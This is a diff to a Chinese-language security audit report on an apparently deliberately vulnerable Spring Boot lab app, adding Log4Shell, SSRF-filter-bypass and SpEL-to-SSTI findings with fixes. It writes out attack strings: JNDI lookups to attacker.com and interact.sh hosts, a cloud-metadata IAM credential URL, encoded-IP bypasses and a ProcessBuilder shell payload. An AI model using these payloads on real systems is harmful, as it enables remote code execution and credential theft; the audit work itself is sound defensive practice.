@@ -14,14 +14,17 @@
 | VUL-02 | SSTI（Thymeleaf 预处理表达式） | 严重 | SSTI.java / ssti.html |
 | VUL-03 | SSTI（视图名称可控） | 严重 | SSTI.java |
 | VUL-04 | SpEL 注入（StandardEvaluationContext） | 严重 | SpEL.java |
+| **VUL-20** | **Log4Shell（CVE-2021-44228）日志注入 RCE** | **严重** | **全局 log.info() 调用 / pom.xml** |
 | VUL-05 | SSRF（无过滤，支持任意协议） | 高危 | SSRF.java / Http.java |
 | VUL-06 | SSRF（重定向绕过内网检测） | 高危 | SSRF.java / Http.java |
+| **VUL-21** | **SSRF 内网检测正则绕过（IPv6/169.254 等）** | **高危** | **Security.java / SSRF.java** |
 | VUL-07 | 任意文件上传（无过滤） | 高危 | Upload.java |
 | VUL-08 | 文件上传黑名单绕过 | 高危 | Upload.java |
 | VUL-09 | 文件上传路径穿越 | 高危 | Upload.java |
 | VUL-10 | 开放重定向（无过滤） | 中危 | Redirect.java |
 | VUL-11 | 开放重定向（白名单绕过-包含检测） | 中危 | Redirect.java |
 | VUL-12 | 开放重定向（白名单绕过-反斜杠） | 中危 | Redirect.java |
+| **VUL-22** | **SpEL 结果作为视图名触发链式 SSTI** | **中危** | **SpEL.java** |
 | VUL-13 | SQL 关键词过滤函数失效 | 中危 | Security.java |
 | VUL-14 | Spring Actuator 全端点暴露 | 中危 | application-dev.properties |
 | VUL-15 | Druid 监控控制台弱口令 | 中危 | application-dev.properties |
@@ -174,6 +177,142 @@ GET /spel?exec=T(java.lang.ProcessBuilder).new(new String[]{"/bin/bash","-c","wh
 ```
 
 **修复建议**：改用 `SimpleEvaluationContext`，它限制了可访问的类型和方法，且不允许调用 `T()` 运算符；或禁止用户直接输入 SpEL 表达式。
+
+---
+
+### VUL-20：Log4Shell（CVE-2021-44228）- 日志注入 RCE
+
+**危险等级**：严重（可 RCE，无需认证）
+**漏洞文件**：
+- `pom.xml`（第 33-34 行）：引入 `spring-boot-starter-log4j2`
+- `Redirect.java`（第 23-25 行）：`log.info(url)`
+- `SSRF.java`（第 29 行）：`log.info("访问路径：" + url)`
+- `SQLinj.java`（第 33 行）：`log.info("输入的查询payload: "+id)`
+- `SpEL.java`（第 40 行）：`log.info(exec)`
+- `Upload.java`（第 63、92 行）：`log.info("后缀名: "+suffix)`
+
+**漏洞代码**：
+
+```xml
+<!-- pom.xml:33-34 -->
+<dependency>
+    <groupId>org.springframework.boot</groupId>
+    <artifactId>spring-boot-starter-log4j2</artifactId>
+</dependency>
+```
+
+```java
+// Redirect.java:23-25 - 注释中已有 JNDI payload
+// http://127.0.0.1:8999/redirect/1?url=${jndi:ldap://attacker.com/exp}
+@GetMapping("/1")
+public String vul(String url) {
+    log.info(url);  // 用户输入直接传入 log，触发 Log4j2 JNDI 解析
+    return "redirect:" + url;
+}
+```
+
+**漏洞分析**：
+Spring Boot 2.1.3.RELEASE（2019 年 3 月发布）内置 Log4j2 **2.11.x**，该版本落在 Log4Shell 受影响范围内（2.0-beta9 ~ 2.14.1）。
+
+Log4j2 在处理日志消息时，会对 `${...}` 格式的字符串进行 Lookup 解析。当用户输入包含 `${jndi:ldap://attacker.com/a}` 时，Log4j2 会向攻击者控制的服务器发起 JNDI/LDAP 请求，加载并执行远程 Java 类，实现 RCE。
+
+代码注释中已经明确标注了 JNDI payload：
+```
+// http://127.0.0.1:8999/redirect/1?url=${jndi:ldap://...interact.sh/exp}
+// http://127.0.0.1:8999/redirect/1?url=${jndi:ldap://${sys:os.name}....sh/exp}
+// http://127.0.0.1:8999/spel?exec=${jndi:ldap://...interact.sh}
+```
+
+**受影响端点**（所有日志用户输入的端点）：
+```
+GET /redirect/1?url=${jndi:ldap://attacker.com/a}
+GET /ssrf/1?url=${jndi:ldap://attacker.com/a}
+GET /sqlinj/mysql/getbyid/${jndi:ldap://attacker.com/a}
+GET /spel?exec=${jndi:ldap://attacker.com/a}
+```
+
+**修复建议**：升级 Log4j2 至 2.17.1 及以上；或在 JVM 启动参数中添加 `-Dlog4j2.formatMsgNoLookups=true`。
+
+---
+
+### VUL-21：SSRF 内网检测正则存在多种绕过
+
+**危险等级**：高危
+**漏洞文件**：`src/main/java/com/ffffffff0x/exploit/util/Security.java`（第 20 行）
+
+**漏洞代码**：
+
+```java
+public static boolean isIntranet(String url) {
+    Pattern reg = Pattern.compile(
+        "^(127\\.0\\.0\\.1)|(localhost)|(10\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})" +
+        "|(172\\.((1[6-9])|(2\\d)|(3[01]))\\.\\d{1,3}\\.\\d{1,3})" +
+        "|(192\\.168\\.\\d{1,3}\\.\\d{1,3})$"
+    );
+    Matcher match = reg.matcher(url);
+    return match.find();
+}
+```
+
+**漏洞分析**：
+
+**1. 正则锚点分组错误**：`|` 运算符的优先级最低，导致 `^` 锚点只约束第一个分支 `127.0.0.1`，`$` 锚点只约束最后一个分支 `192.168.x.x`。中间三个分支（localhost、10.x.x.x、172.x.x.x）没有任何锚点，但这不影响 `find()` 的基本功能。
+
+**2. 未覆盖的内网地址格式（可绕过）**：
+
+| 绕过方式 | 示例 | 说明 |
+|---------|------|------|
+| IPv6 回环地址 | `http://[::1]/` | 未检测 IPv6 |
+| IPv4 映射 IPv6 | `http://[::ffff:127.0.0.1]/` | 未检测 |
+| 云元数据服务 | `http://169.254.169.254/` | 链路本地地址未列入黑名单 |
+| 十六进制 IP | `http://0x7f.0.0.1/` | `127.0.0.1` 的十六进制表示 |
+| 八进制 IP | `http://0177.0.0.1/` | `127.0.0.1` 的八进制表示 |
+| 十进制 IP | `http://2130706433/` | `127.0.0.1` 的十进制整数表示 |
+| `0.0.0.0` | `http://0.0.0.0/` | 某些系统等价于 `127.0.0.1` |
+| URL 编码 | `http://127.0.0.1%0d/` | 含特殊字符干扰解析 |
+
+**最危险的是 `169.254.169.254`（AWS/阿里云/GCP 云元数据服务）**，该地址完全不在黑名单中，攻击者可通过 SSRF 读取云实例的 IAM Token、用户数据等敏感信息。
+
+**攻击向量**：
+```
+GET /ssrf/2?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+GET /ssrf/2?url=http://[::1]/admin
+GET /ssrf/2?url=http://0x7f.0.0.1/
+```
+
+**修复建议**：解析 IP 后将其转为标准化 long 整数进行范围比较，覆盖所有内网段（包括 169.254.0.0/16、100.64.0.0/10 等）；同时处理 IPv6。
+
+---
+
+### VUL-22：SpEL 结果作为视图名触发链式 SSTI
+
+**危险等级**：中危（实际因 VUL-04 已可直接 RCE，此为附加风险）
+**漏洞文件**：`src/main/java/com/ffffffff0x/exploit/SpEL.java`（第 20-21 行）
+
+**漏洞代码**：
+
+```java
+@Api(tags = "SpEL注入")
+@Slf4j
+@Controller        // ← 注意：使用的是 @Controller，而非 @RestController
+public class SpEL {
+    @GetMapping("/spel")
+    public String vul1(String exec) {
+        ...
+        result = parser.parseExpression(exec).getValue(evaluationContext).toString();
+        return result;   // ← @Controller 下，返回的 String 会被 Spring MVC 当作视图名称解析
+    }
+}
+```
+
+**漏洞分析**：
+`@RestController` = `@Controller` + `@ResponseBody`。当使用 `@Controller` 且方法没有 `@ResponseBody` 注解时，返回的 `String` 会被 ViewResolver（此处为 Thymeleaf）当作模板名称处理，而不是直接输出。
+
+这意味着：
+1. SpEL 表达式被求值后得到一个字符串（如攻击者精心构造的模板路径）
+2. 该字符串再次被 Thymeleaf 解析，若包含 `__${...}__` 表达式则触发二次 SSTI
+
+实际上，由于 `StandardEvaluationContext` 本身已经允许直接执行任意代码（VUL-04），此漏洞的额外风险在于增加了利用的复杂性和路径，但也使得错误处理时的防御更加困难。
 
 ---
 
@@ -595,21 +734,25 @@ public static String ip(HttpServletRequest request) {
 
 ## 修复优先级建议
 
-### 立即修复（严重/高危）
+### 立即修复（严重）
 
-1. **VUL-01**：将 MyBatis 中所有 `${id}` 改为 `#{id}`
-2. **VUL-02/03**：禁止用户输入影响 Thymeleaf 预处理表达式或视图名称
-3. **VUL-04**：将 `StandardEvaluationContext` 改为 `SimpleEvaluationContext`，或完全禁止用户输入 SpEL
-4. **VUL-05/06**：实现严格的 SSRF 防护（协议白名单 + 内网 IP 黑名单 + 禁止重定向）
-5. **VUL-07/08/09**：文件上传改用扩展名白名单 + 随机文件名 + 路径穿越检测
+1. **VUL-20 Log4Shell**：升级 Log4j2 至 2.17.1+（即升级 Spring Boot 版本）；临时缓解可设置 `-Dlog4j2.formatMsgNoLookups=true`
+2. **VUL-01**：将 MyBatis 中所有 `${id}` 改为 `#{id}` 实现参数化查询
+3. **VUL-02/03**：禁止用户输入影响 Thymeleaf 预处理表达式或视图名称
+4. **VUL-04**：将 `StandardEvaluationContext` 改为 `SimpleEvaluationContext`；同时将 `@Controller` 改为 `@RestController`（修复 VUL-22）
+5. **VUL-05/06/21**：SSRF 防护需同时覆盖：协议白名单、内网段黑名单（含 169.254.x.x、IPv6）、禁止跟随重定向
 
-### 尽快修复（中危）
+### 尽快修复（高危）
 
-6. **VUL-13**：修复 `checkSql` 中 `split("|")` 为 `split("\\|")`
-7. **VUL-14**：限制 Actuator 端点暴露并添加认证
-8. **VUL-15**：修改 Druid 默认口令，限制访问 IP
-9. **VUL-16**：移除硬编码凭据，使用环境变量或密钥管理服务
-10. **VUL-17**：移除或保护云凭据页面
+6. **VUL-07/08/09**：文件上传改用扩展名白名单 + 随机文件名 + 路径穿越检测（`Paths.get(fileName).getFileName()`）
+
+### 计划修复（中危）
+
+7. **VUL-13**：修复 `checkSql` 中 `split("|")` 为 `split("\\|")`
+8. **VUL-14**：`management.endpoints.web.exposure.include` 只暴露必要端点并添加 Spring Security 认证
+9. **VUL-15**：修改 Druid 控制台密码，设置 `allow=127.0.0.1`
+10. **VUL-16**：移除硬编码凭据，改用环境变量或 Vault
+11. **VUL-17**：移除或添加权限控制保护云凭据页面
 
 ---
 
